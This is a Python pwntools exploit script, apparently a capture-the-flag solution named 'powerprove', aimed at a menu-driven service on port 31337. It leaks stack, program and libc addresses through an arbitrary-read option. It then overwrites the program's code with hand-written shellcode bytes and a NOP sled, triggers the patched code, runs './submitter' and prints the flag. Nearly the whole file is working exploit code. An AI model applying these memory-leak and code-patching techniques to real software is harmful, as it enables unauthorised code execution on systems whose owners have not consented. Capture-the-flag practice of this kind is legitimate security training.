#!/usr/bin/env/python3
# powerprove

from pwn import *


def menu(index):
    s.recvuntil(b": \n")
    s.sendline(index)

def readv(index):
    menu(b"1")
    s.recvuntil(b": \n")
    s.sendline(index)

def writev(value, index):
    menu(b"2")
    s.recvuntil(b": \n")
    s.sendline(value)
    s.recvuntil(b": \n")
    s.sendline(index)

def reverse_hex_string(hex_string):
    byte_array = bytes.fromhex(hex_string)
    reversed_bytes = byte_array[::-1]
    reversed_hex_string = reversed_bytes.hex().upper().rjust(16, "0")
    print(reversed_hex_string)
    return reversed_hex_string

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
readv(b"0")
s.recvuntil(b"Value: ")
stack = int(s.recvuntil(b"\n")[:-1], 16)
log.info(hex(stack))
readv(hex(stack+0x78).encode())
s.recvuntil(b"Value: ")
code = int(s.recvuntil(b"\n")[:-1], 16) - 0x40
log.info(hex(code))
readv(hex(code+0x3538).encode())
s.recvuntil(b"Value: ")
libc = int(s.recvuntil(b"\n")[:-1], 16) - 0x11bee0
log.info(hex(libc))

#pause()
writev(b"c35bc031f275c2ff",hex(code+0x1484).encode())


writev(b"48050f6eb0c03148", hex(code+0x148B).encode())
writev(b"d23148f63148c789", hex(code+0x148B+8).encode())
writev(b"be48909090909090", hex(code+0x148B+0x10).encode())
writev(hex(code+0x3560)[2:].rjust(16,"0").encode(), hex(code+0x148B+0x18).encode())
writev(b"bA48909090909090", hex(code+0x148B+0x20).encode())
writev(hex(libc+0xebc81)[2:].rjust(16,"0").encode(), hex(code+0x148B+0x28).encode())
writev(b"9090909090909090", hex(code+0x148B+0x30).encode())
writev(b"9090909090909090", hex(code+0x148B+0x38).encode())
writev(b"9090909090909090", hex(code+0x148B+0x40).encode())
writev(b"9090909090909090", hex(code+0x148B+0x48).encode())
writev(b"9090909090909090", hex(code+0x148B+0x50).encode())
writev(b"9090909090909090", hex(code+0x148B+0x58).encode())
writev(b"9090909090909090", hex(code+0x148B+0x60).encode())
writev(b"9090909090909090", hex(code+0x148B+0x68).encode())
writev(b"9090909090909090", hex(code+0x148B+0x69).encode())
writev(b"9090909090909090", hex(code+0x1484).encode())

sleep(0.4)
menu(b"3")
sleep(0.3)
s.sendline(b"./submitter")
print(s.recvuntil(b"}"))
